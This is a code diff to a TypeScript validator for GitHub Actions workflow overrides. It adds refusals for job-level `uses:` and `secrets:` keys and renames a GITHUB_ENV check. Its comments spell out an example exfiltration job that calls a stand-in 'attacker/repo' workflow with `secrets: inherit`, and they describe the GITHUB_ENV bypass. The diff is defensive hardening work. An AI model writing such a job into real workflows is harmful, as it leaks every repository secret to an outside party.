@@ -76,6 +76,25 @@ import {
  *     name instead, per plan-verifier's explicit "own distinct violated
  *     name" instruction for this check.
  *
+ * Fix-loop iteration 2 (`plan-verifier` re-check, one new Major finding
+ * against the SAME AC-24 invariant, surviving iteration 1's fixes): a
+ * REUSABLE-WORKFLOW-CALL job (`jobs.exfil: { uses: 'attacker/repo/
+ * .github/workflows/x.yml@<sha>', secrets: inherit }`) has no `steps` at
+ * all, so the per-job loop's `continue` on a missing `steps` array skipped
+ * every step-level check — including the `uses:` identity allowlist above,
+ * which only ever ran INSIDE the step loop — leaving `job.uses` unchecked
+ * by anything, and `secrets: inherit` (which hands the called workflow
+ * EVERY repository secret) unscanned by anything, since `mapHasForeignSecretRef`
+ * only ever inspected `env:`/`with:` MAPPINGS, never a `secrets:` key whose
+ * value here is the bare string `'inherit'`, not a map. Both refused
+ * unconditionally (this module's own generator never emits a job-level
+ * `uses:` — every legitimate job is inline steps): `job.uses` under the
+ * existing `action_not_allowlisted` name, `job.secrets` under the existing
+ * `foreign_secret_reference` name — no new violated names, per
+ * plan-verifier's own read that this is the same invariant as the
+ * `with:`/`env:`/step-`uses:` checks above, reached via a channel none of
+ * them covers.
+ *
  * Refuses, never sanitizes (A10 fail-closed) — every failure path returns
  * `{ ok: false, violated: <name> }` naming the invariant that failed; the
  * caller commits nothing on any `ok: false` result.
@@ -153,12 +172,16 @@ function mapHasForeignSecretRef(map: unknown, allowed: ReadonlySet<string>): boo
   );
 }
 
-/** `GITHUB_ENV` (fix-loop iteration 1): `true` if `script` references the
- *  token anywhere — refused unconditionally, on EVERY step's `run:` body,
- *  not just the review step's, since the bypass this closes is a step
- *  BEFORE the review step writing into the job's environment for the
- *  review step to inherit. */
-function containsGithubEnvWrite(script: string): boolean {
+/** `GITHUB_ENV` (fix-loop iteration 1; renamed fix-loop iteration 2 to
+ *  match what this actually checks — a MENTION of the token anywhere,
+ *  including inside a comment, not only an `>> $GITHUB_ENV`-shaped write):
+ *  `true` if `script` references the token anywhere — refused
+ *  unconditionally, on EVERY step's `run:` body, not just the review
+ *  step's, since the bypass this closes is a step BEFORE the review step
+ *  writing into the job's environment for the review step to inherit. The
+ *  `github_env_write` violation NAME is unchanged — that names the
+ *  invariant being enforced, not this predicate. */
+function mentionsGithubEnv(script: string): boolean {
   return GITHUB_ENV_RE.test(script);
 }
 
@@ -178,9 +201,15 @@ export function validateWorkflowOverride(text: string, layout: ExpectedLayout): 
     ingestSecretNameFor(layout.namespace),
   ]);
 
-  // ---- AC-24 / Recommendation 5: no foreign secret ref at workflow level,
-  // in EITHER env: or with: (fix-loop iteration 1 widens the scan to with:) --
-  if (mapHasForeignSecretRef(doc.env, allowedSecrets) || mapHasForeignSecretRef(doc.with, allowedSecrets)) {
+  // ---- AC-24 / Recommendation 5: no foreign secret ref at workflow-level
+  // env: (fix-loop iteration 2 dropped a `doc.with` scan that used to sit
+  // here — `with:` is not a valid workflow-level Actions key at all; only
+  // steps and reusable-workflow-call JOBS have one, and job-level `with:`
+  // is still scanned below, in the job loop. The one workflow-level surface
+  // this might have been guarding — `on.workflow_call.secrets` — is
+  // unreachable anyway, since the `on:` block below is pinned to EXACTLY
+  // `{ pull_request: {...} }`; a `workflow_call` trigger can never appear.) --
+  if (mapHasForeignSecretRef(doc.env, allowedSecrets)) {
     return { ok: false, violated: 'foreign_secret_reference' };
   }
   // ---- AC-24 / Recommendation 4: DEVDIGEST_DIR never at workflow level ----
@@ -223,6 +252,30 @@ export function validateWorkflowOverride(text: string, layout: ExpectedLayout): 
   for (const job of Object.values(jobs)) {
     if (!isPlainObject(job)) return { ok: false, violated: 'jobs_missing' };
     if ('permissions' in job) return { ok: false, violated: 'job_level_permissions' };
+
+    // ---- AC-24 fix-loop iteration 2 (plan-verifier re-check, Major): a
+    // job-level `uses:` (a reusable-workflow-call job, e.g. `jobs.exfil:
+    // { uses: 'attacker/repo/.github/workflows/x.yml@<sha>' }`) has no
+    // `steps`, so it `continue`s past every step-level check below —
+    // including the `uses:` allowlist, which only runs inside the step
+    // loop, so `job.uses` itself was never matched against anything. This
+    // module's OWN generator never emits a job-level `uses:` — every
+    // legitimate job here is inline steps — so ANY job-level `uses:` is
+    // refused unconditionally, not allowlist-checked, under the SAME
+    // `action_not_allowlisted` name the step-level identity check uses
+    // (same invariant: an unrecognized `uses:` target). ----
+    if ('uses' in job) return { ok: false, violated: 'action_not_allowlisted' };
+
+    // ---- AC-24 fix-loop iteration 2 (plan-verifier re-check, Major): a
+    // job-level `secrets:` key (`secrets: inherit` is the attack shape) on
+    // a reusable-workflow-call job hands the CALLED workflow — a repository
+    // DevDigest does not own — every repository secret, including every
+    // OTHER installation's `DEVDIGEST_INGEST_TOKEN_<NS>`. Refused
+    // unconditionally, same shape as the `'permissions' in job` guard
+    // above, under the SAME `foreign_secret_reference` name every other
+    // secret-exfiltration channel in this file already uses. ----
+    if ('secrets' in job) return { ok: false, violated: 'foreign_secret_reference' };
+
     if (typeof job.if === 'string' && job.if.trim() === FORK_GUARD_EXPR) forkGuardFound = true;
 
     // ---- AC-24 / Recommendation 4/5: job-level env — no DEVDIGEST_DIR
@@ -290,7 +343,7 @@ export function validateWorkflowOverride(text: string, layout: ExpectedLayout): 
         // otherwise bypass every env:-map check above, since GITHUB_ENV is
         // a THIRD way (next to env: inheritance) a step's environment gets
         // populated. ----
-        if (containsGithubEnvWrite(step.run)) {
+        if (mentionsGithubEnv(step.run)) {
           return { ok: false, violated: 'github_env_write' };
         }
         // ---- the review step's run: is RUN_COMMAND, exactly (AC-25) — the
